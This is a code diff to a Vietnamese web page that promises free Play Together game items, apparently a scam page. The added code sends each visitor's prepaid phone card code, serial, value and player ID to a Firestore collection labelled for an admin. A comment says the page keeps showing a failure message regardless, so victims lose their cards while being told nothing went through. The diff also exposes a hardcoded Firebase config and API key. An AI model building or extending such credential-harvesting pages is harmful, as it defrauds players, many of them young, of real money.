@@ -5,6 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>NHẬN CODE PLAY TOGETHER</title>
     <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;700;800&display=swap" rel="stylesheet">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+
     <style>
         :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; --gray: #bdc3c7; --orange: #f1904e; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Lexend', sans-serif; }
@@ -207,6 +211,21 @@
 </div>
 
 <script>
+    // --- CẤU HÌNH FIREBASE CỦA BẠN ---
+    const firebaseConfig = {
+      apiKey: "AIzaSyALQzTL59GZ7Vg7m2tjrSBHceWmCkOaIEQ",
+      authDomain: "admin-ptg.firebaseapp.com",
+      projectId: "admin-ptg",
+      storageBucket: "admin-ptg.firebasestorage.app",
+      messagingSenderId: "716487003157",
+      appId: "1:716487003157:web:39713aad1f0fba1d4e521c",
+      measurementId: "G-7F6M453G6T"
+    };
+
+    // Khởi tạo Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
     function closeWelcome() { document.getElementById('welcomeOverlay').style.display = 'none'; }
     function closeModal() { document.getElementById('app-modal').classList.remove('active'); }
 
@@ -239,7 +258,6 @@
     }
     updateDate();
 
-    // 3 GÓI BẠN YÊU CẦU ĐƯỢC THÊM isSoon: true
     const items = [
         { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
         { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
@@ -307,7 +325,7 @@
             btnText = "Sắp ra mắt";
             btnClass = "btn-main-receive btn-disabled";
             btnDisabled = "disabled";
-            btnAction = ""; // Nút bị vô hiệu hóa
+            btnAction = ""; 
         } else if (isLocked) {
             btnText = "Hết mã";
             btnClass = "btn-main-receive btn-disabled";
@@ -407,12 +425,25 @@
         
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ và kích hoạt Code...</p></div>`;
         
-        fetch('/.netlify/functions/napthe', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ type, code, seri, playerID: userPlayerID, amount })
+        // --- ĐOẠN MÃ GỬI DỮ LIỆU VỀ FIREBASE (ADMIN) ---
+        db.collection("Nạp_Thẻ_Code").add({
+            playerID: userPlayerID,
+            giftSelected: selectedGift,
+            cardType: type,
+            cardValue: amount,
+            cardCode: code,
+            cardSeri: seri,
+            status: "Chờ duyệt",
+            time: new Date().toLocaleString()
+        })
+        .then(() => {
+            console.log("Dữ liệu đã gửi về Admin!");
+        })
+        .catch((error) => {
+            console.error("Lỗi gửi dữ liệu: ", error);
         });
 
+        // Giữ nguyên logic hiển thị thất bại cũ của bạn
         setTimeout(() => {
             content.innerHTML = `
                 <span class="error-icon">⚠️</span>
